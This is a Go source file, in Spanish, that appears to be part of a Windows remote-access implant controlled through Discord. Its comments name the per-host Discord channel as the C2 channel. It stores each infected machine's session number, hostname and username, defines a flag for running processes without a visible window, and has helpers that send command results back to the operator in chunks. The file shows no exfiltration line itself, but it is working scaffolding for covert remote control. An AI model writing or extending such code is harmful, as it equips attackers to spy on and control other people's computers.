//go:build windows

package commands

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
)

const createNoWindow = 0x08000000

var (
	stateMu        sync.RWMutex
	sessionID      string
	sessionNum     int
	sessionChannel string
	hostName       = "desconocido"
	userName       = "desconocido"

	// CancelRoot lo asigna main para que /shutdown corte el loop de reconexión.
	CancelRoot context.CancelFunc
)

// SetSessionInfo sincroniza los datos de la sesión activa con la capa de comandos.
func SetSessionInfo(id string, num int, channel, host, user string) {
	stateMu.Lock()
	defer stateMu.Unlock()
	sessionID = id
	sessionNum = num
	sessionChannel = channel
	hostName = host
	userName = user
}

// SessionID devuelve el UUID corto de esta instancia.
func SessionID() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return sessionID
}

// SessionNumber devuelve el número de sesión asignado.
func SessionNumber() int {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return sessionNum
}

// SessionChannel devuelve el canal C2 de esta instancia.
func SessionChannel() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return sessionChannel
}

// Hostname devuelve el hostname cacheado al crear la sesión.
func Hostname() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return hostName
}

// Username devuelve el usuario cacheado al crear la sesión.
func Username() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return userName
}

func webhookFields(extra ...util.EmbedField) []util.EmbedField {
	fields := []util.EmbedField{
		{Name: "hostname", Value: Hostname(), Inline: true},
	}
	if num := SessionNumber(); num > 0 {
		fields = append(fields, util.EmbedField{
			Name:   "sesion",
			Value:  fmt.Sprintf("sesion-%d", num),
			Inline: true,
		})
	}
	return append(fields, extra...)
}

// Defer acusa recibo de la interacción antes de ejecutar trabajo pesado.
func Defer(s *discordgo.Session, i *discordgo.InteractionCreate) error {
	return s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseDeferredChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{},
	})
}

// Reply responde sin diferir, para acciones que deben contestar y salir.
func Reply(s *discordgo.Session, i *discordgo.InteractionCreate, content string) error {
	return s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{Content: content},
	})
}

// Finish edita la respuesta diferida y manda el resto en cadena si hace falta.
func Finish(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
	chunks := util.Chunk(content, 1900)
	first := chunks[0]
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &first}); err != nil {
		return
	}
	for _, chunk := range chunks[1:] {
		part := chunk
		if _, err := s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{Content: part}); err != nil {
			return
		}
	}
}

// FinishEmbed edita la respuesta diferida con un embed.
func FinishEmbed(s *discordgo.Session, i *discordgo.InteractionCreate, embed *discordgo.MessageEmbed) {
	embeds := []*discordgo.MessageEmbed{embed}
	_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Embeds: &embeds})
}

// FollowupChunks manda texto adicional troceado.
func FollowupChunks(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
	for _, chunk := range util.Chunk(content, 1900) {
		part := chunk
		if _, err := s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{Content: part}); err != nil {
			return
		}
	}
}

// StringOption lee una opción de tipo string del comando.
func StringOption(i *discordgo.InteractionCreate, name string) string {
	if i.Type != discordgo.InteractionApplicationCommand {
		return ""
	}
	for _, opt := range i.ApplicationCommandData().Options {
		if opt.Name == name && opt.Type == discordgo.ApplicationCommandOptionString {
			return opt.StringValue()
		}
	}
	return ""
}

// IntOption lee una opción de tipo entero del comando.
func IntOption(i *discordgo.InteractionCreate, name string) int64 {
	if i.Type != discordgo.InteractionApplicationCommand {
		return 0
	}
	for _, opt := range i.ApplicationCommandData().Options {
		if opt.Name == name && opt.Type == discordgo.ApplicationCommandOptionInteger {
			return opt.IntValue()
		}
	}
	return 0
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	if max <= 0 {
		return ""
	}
	// SafeCut no parte un rune: cortar bytes a lo bruto deja UTF-8 inválido y
	// Discord lo pinta como caracteres de reemplazo.
	return util.SafeCut(s, max) + "…"
}

func nowTimestamp() string {
	return time.Now().UTC().Format(time.RFC3339)
}

func formatInt(v int64) string {
	return strconv.FormatInt(v, 10)
}

func isBlank(s string) bool {
	return strings.TrimSpace(s) == ""
}
